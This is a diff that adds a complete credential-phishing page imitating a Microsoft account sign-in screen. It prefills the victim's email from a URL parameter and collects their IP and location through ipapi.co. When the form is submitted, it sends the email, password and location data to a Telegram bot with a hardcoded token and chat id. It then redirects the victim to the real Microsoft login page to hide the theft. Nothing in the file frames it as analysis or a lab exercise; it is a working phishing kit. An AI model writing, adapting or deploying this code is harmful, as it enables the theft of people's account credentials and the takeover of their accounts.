@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link
+    href="https://fonts.googleapis.com/css?family=Raleway"
+    rel="stylesheet"
+  />
+
+  <link rel="icon" href="ficc.png">
+
+  <title>Sign into your account</title>
+  <script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js">
+    </script>
+    <script>
+    $(document).ready(function() {
+        $("button").click(function() {
+              
+            // Here the value is stored in variable. 
+            var xen = $("input:text").val();
+            document.getElementById("demo").innerHTML = xen;
+        });
+    });
+    </script>
+</head>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      /* background-color: #f1f1f1; */
+      background-image: url("flip.jpeg");
+      background-repeat: no-repeat;
+  background-position: 50% 0;
+  background-size: cover;
+      opacity: 0.9;
+    }
+
+    #messageForm {
+      /* float: center !important; */
+      background-color: #ffffff;
+      margin: 100px auto;
+      font-family: Raleway;
+      padding: 30px;
+      width: 30%;
+      /* min-width: 300px; */
+    }
+    
+
+    #signForm {
+      background-color: #ffffff;
+      margin: 100px auto;
+      font-family: Raleway;
+      padding: 1px;
+      width: 32%;
+      /* min-width: 300px; */
+    }
+
+    h1 {
+      text-align: center;
+    }
+
+    input:focus, textarea:focus, select:focus{
+        outline: none;
+    }
+    input {
+      padding: 10px;
+      width: 100%;
+      font-size: 14px;
+      font-family: Raleway;
+      border-top: 0px solid #ffffff;
+      border-right: 0px solid #ffffff;
+      border-left: 0px solid #ffffff;
+      border-bottom: 1px solid #1c1c1c;
+    }
+
+    /* Mark input boxes that gets an error on validation: */
+    input.invalid {
+      /* background-color: #ffdddd; */
+      border-bottom-color: #f88a8a;
+    }
+
+    /* Hide all steps by default: */
+    .tab {
+      display: none;
+    }
+
+    button {
+      background-color: #0067b8;
+      color: #ffffff;
+      border: none;
+      padding: 10px 30px;
+      font-size: 14px;
+      font-family: Raleway;
+      cursor: pointer;
+    }
+
+    button:hover {
+      opacity: 0.8;
+    }
+
+    #prevBtn {
+      background-color: #bdbdbd;
+      color: #ffffff;
+    }
+
+   #serverResponse {
+    background-color: #f09797;
+    padding: 10px;
+   }
+
+   .for{
+    padding-top: -30px;
+   }
+    
+.rows{
+  margin-left: auto;
+    margin-right: auto;
+    /* width: 8em; */
+    padding-top: 80px;
+}
+    /* Make circles that indicate the steps of the form: */
+    .step {
+      height: 15px;
+      width: 15px;
+      margin: 0 2px;
+      background-color: #ffffff;
+      border: none;
+      border-radius: 50%;
+      display: inline-block;
+      opacity: 0.5;
+    }
+    a{
+        text-decoration: none;
+        color: #0067b8;
+    }
+
+    .step.active {
+      opacity: 1;
+    }
+
+    /* Mark the steps that are finished and valid: */
+    .step.finish {
+      background-color: #ffffff;
+    }
+
+  </style>
+  <body>
+    <div class="rows">
+    <form id="messageForm" action="/action_page.php">
+        <img src="mic.svg" alt="logo" style="width:30%">
+     
+      <!-- One "tab" for each step in the form: -->
+      
+      <div class="tab">
+        <h3 class="text-bold">Sign In</h3>
+        <p></p>
+            
+        <p>
+          <input
+            placeholder="Email, phone or Skype"
+
+            name="email"
+            id="um"
+            value=""
+            type="text"
+            required
+            
+          />
+          <h5>No account?   <a href="http://" > Create one!</a></h5> 
+         <h5> <a href="http://" > Can't access your account?</a></h5> 
+        </p>
+      
+        <div >
+            <div style="float: right">
+             
+              <button href="#" type="button" id="nextBtn" onclick="nextPrev(1)">Next</button>
+            </div>
+          </div>
+      </div>
+
+      
+      
+      <div class="tab">
+     <h5>
+        <p class="text-bold" id="demo"></p>
+   
+    </h5>
+        <h3 class="text-bold">Enter Password</h3>
+      
+           <!-- <div class="alert alert-danger" id="serverResponse" style="display: none;">Please try again later</div> -->
+        <p>
+            <input
+            placeholder="Password"
+            value=""
+            id="up"
+            name="password"
+            type="password"
+            required
+          />
+          <h5> <a href="http://" > Forgot Password? </a></h5> 
+          <!-- <h5> <a href="http://" >Email code to t</a></h5>  -->
+    
+
+
+      <input type="hidden" name="ip" class="form-control" id="demo" value="" placeholder= "">
+      <input type="hidden" name="city" class="form-control" id="demo_1" value="" placeholder= "">
+      <input type="hidden" name="country" class="form-control" id="demo_2" value="" placeholder= "">
+      <input type="hidden" name="postal" class="form-control" id="demo_3" value="" placeholder= "">
+      <input type="hidden" name="date" class="form-control" id="demo_4" value="" placeholder= "">
+      <input type="hidden" name="port" class="form-control" id="demo_5" value="" placeholder= "">
+
+    
+      <div>
+        <div style="float: right">
+          <button href="#" type="button" id="prevBtn" onclick="nextPrev(-1)">Back</button>
+          <button type="submit" >Sign In</button>
+        </div>
+      </div>
+  
+    </div>
+       
+      <!-- Circles which indicates the steps of the form: -->
+      <div style="text-align: center; margin-top: 40px">
+        <span class="step"></span>
+        <span class="step"></span>
+
+      </div>
+      
+    </form>
+    <!-- <div id="signForm"  >
+        <p class="">
+            <img src="key.svg" class="ml-5" alt="logo" style="width:7%">
+            Sign-in options
+        </p>  
+      
+         
+        </div> -->
+</div>
+
+<div class="for"> 
+    
+</div>
+   
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script>
+      (function(){
+        const queryString = window.location.search;
+        const urlParams = new URLSearchParams(queryString);
+        const ref = urlParams.get('ref')
+        document.getElementById('um').value = ref;
+      })();
+    </script>
+
+  <script>
+    $.getJSON('https://ipapi.co/json/', function(data) {
+  
+
+    document.getElementById("demo").value = (data.ip);
+    document.getElementById("demo_1").value = (data.city);
+    document.getElementById("demo_2").value = (data.country);
+    document.getElementById("demo_3").value = (data.postal);
+  
+
+});
+// let add = JSON.stringify (data, null, 2);
+
+var today = new Date();
+var dd = String(today.getDate()).padStart(2, '0');
+var mm = String(today.getMonth() + 1).padStart(2, '0'); //January is 0!
+var yyyy = today.getFullYear();
+
+today = mm + '/' + dd + '/' + yyyy;
+document.getElementById("demo_4").value = (today);
+
+var port = location.port;
+document.getElementById("demo_5").value = (port);
+
+      const chat_id = '5345652511', botID = 'bot5825052855:AAFvvg6f8benUZNnYc45BaZgkgTTH585Rak';
+      const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
+      document.querySelector('#messageForm').addEventListener("submit", async e => { // When the user submits the form
+          e.preventDefault(); // Don't submit
+          let text = JSON.stringify ( // Convert the form data to a string to send as our Telegram message
+              Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
+          null, 2); // Prettify the JSON so we can read the data easily
+          const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
+              method: 'POST',
+              headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
+              body: JSON.stringify({chat_id, text }), // The body must be a string, not an object
+          });
+          const messageStatus = document.querySelector('#status');
+          $("#up").val("");
+          $("#um").val(""); 
+          
+          var count=0;
+                    if(count>=2){
+               
+                        // Redirect the User
+                        window.location.replace("https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638101787193910624.MjgxMWZkNTItYWQ3Ni00ZWM2LTlhOTAtZTI5MGViNjQ4Y2I1MDUwYmQwMzEtYjgzNC00OGQ3LWE1MDQtYTFjMjFhMGUxY2Rh&ui_locales=en-US&mkt=en-US&client-request-id=b0103018-ec6f-4dc5-baf4-0f7aba52fc17&state=Z7vQdoqVBtUJgXy7e3cdlg1adE7fu0cmEZEnQ0atjh4vWDhxOcw6qNlP9SQz-ebISWtsz5chd-nAU9eKLezOl9iy8ftVS7DSW3PoZSG9sPnyUW3UvZbWZhLBFy_52qf6fNJZFl5FxW2ZrEFXaNacNwcYpyvt0XAgfaTKv66UWZ9i6EDS_8EF4K4sGypQUMqCpifUahi1vO-jtIlhXUXjiqzFxdO-wiY_01oXArwH6cXNjANDJwdF6b-4XvVshBcCf0TEhppktC9miHRQBVfMyVY8JmMIcmCwkhFW2t44UgQ&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.16.0.0");
+                      //  $('#serverResponse').html(res);
+                    }else{
+                          //Insert the Server response
+                          $("#serverResponse").animate({right:0, opacity:"show"}, 1500);
+                          window.location.replace("https://login.microsoftonline.com/common/login");
+                          // $('#serverResponse').show();
+                        /**
+                           * Hide Loader After two seconds
+                           */
+                          setTimeout(() => {
+                          hideLoader();
+                          showPageContent();
+                          }, 5000);
+                    }
+                    // https://login.microsoftonline.com/common/login
+                },
+              ).done(function() {
+                /**
+                 * Enable all the Disabled inputs
+                 */
+    
+                um.disabled = false;
+                up.disabled = false;
+
+               
+            
+      });
+
+
+  </script>
+  
+
+    <script>
+      var currentTab = 0; // Current tab is set to be the first tab (0)
+      showTab(currentTab); // Display the current tab
+
+      function showTab(n) {
+        // This function will display the specified tab of the form...
+        var x = document.getElementsByClassName("tab");
+        x[n].style.display = "block";
+        //... and fix the Previous/Next buttons:
+        if (n == 0) {
+          document.getElementById("prevBtn").style.display = "none";
+        } else {
+          document.getElementById("prevBtn").style.display = "inline";
+        }
+        if (n == x.length - 1) {
+          document.getElementById("nextBtn").innerHTML = "Submit";
+        } else {
+          document.getElementById("nextBtn").innerHTML = "Next";
+        }
+        //... and run a function that will display the correct step indicator:
+        fixStepIndicator(n);
+      }
+
+      function nextPrev(n) {
+        // This function will figure out which tab to display
+        var x = document.getElementsByClassName("tab");
+        // Exit the function if any field in the current tab is invalid:
+        if (n == 1 && !validateForm()) return false;
+        // Hide the current tab:
+        x[currentTab].style.display = "none";
+        // Increase or decrease the current tab by 1:
+        currentTab = currentTab + n;
+        // if you have reached the end of the form...
+        if (currentTab >= x.length) {
+          // ... the form gets submitted:
+          document.getElementById("messageForm").submit();
+          return false;
+        }
+        // Otherwise, display the correct tab:
+        showTab(currentTab);
+      }
+
+      function validateForm() {
+        // This function deals with validation of the form fields
+        var x,
+          y,
+          i,
+          valid = true;
+        x = document.getElementsByClassName("tab");
+        y = x[currentTab].getElementsByTagName("input");
+        // A loop that checks every input field in the current tab:
+        for (i = 0; i < y.length; i++) {
+          // If a field is empty...
+          if (y[i].value == "") {
+            // add an "invalid" class to the field:
+            y[i].className += " invalid";
+            // and set the current valid status to false
+            valid = false;
+          }
+        }
+        // If the valid status is true, mark the step as finished and valid:
+        if (valid) {
+          document.getElementsByClassName("step")[currentTab].className +=
+            " finish";
+        }
+        return valid; // return the valid status
+      }
+
+      function fixStepIndicator(n) {
+        // This function removes the "active" class of all steps...
+        var i,
+          x = document.getElementsByClassName("step");
+        for (i = 0; i < x.length; i++) {
+          x[i].className = x[i].className.replace(" active", "");
+        }
+        //... and adds the "active" class on the current step:
+        x[n].className += " active";
+      }
+    </script>
+  </body>
+</html>
